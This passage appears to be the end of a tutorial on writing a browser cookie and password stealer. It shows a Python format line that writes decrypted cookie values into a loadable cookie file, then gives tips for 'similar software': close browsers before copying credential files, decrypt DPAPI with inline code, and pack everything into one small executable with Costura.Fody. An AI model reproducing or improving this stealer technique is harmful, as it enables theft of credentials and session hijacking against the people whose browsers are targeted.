[/CODE]



After this, data is written from the database columns in a certain order:

[CODE=python]

    {item[0]}\t{str(bool(item[5])).upper()}\t{item[3]}\t{str(bool(item[6])) .upper()}\t{item[4]}\t{item[1]}\t{decrypted_value}

[/CODE]



This is how you get a finished cookie file. I would like to note that the order when writing to a text file is very important, since if you swap at least some parameter, the cookies simply will not load correctly.



This is where all the code ends. I would like to give a couple of improvement tips for those who want to try writing similar software:

Copying cookies and passwords requires your browsers to be closed, so it's best to close them before collecting the files. They wrote to me that there is an option not to close browser processes, but I have not been interested in this yet. Therefore, the easiest way would be to simply close the processes.
My client uses NuGet packages to work correctly, but the problem is that when compiled, dependencies are obtained in the form of DLL files, and they weigh a lot. Of course, there are ways to have the DLLs not be separate files and have everything compiled into one EXE file, but that still doesn't solve the weight problem. Therefore, if every kilobyte of the executable file is important to you, you will need to use not NuGet packages, for example, to decrypt DPAPI, but files with code that will do this.
NuGet package that will embed all DLLs into one executable: Costura.Fody
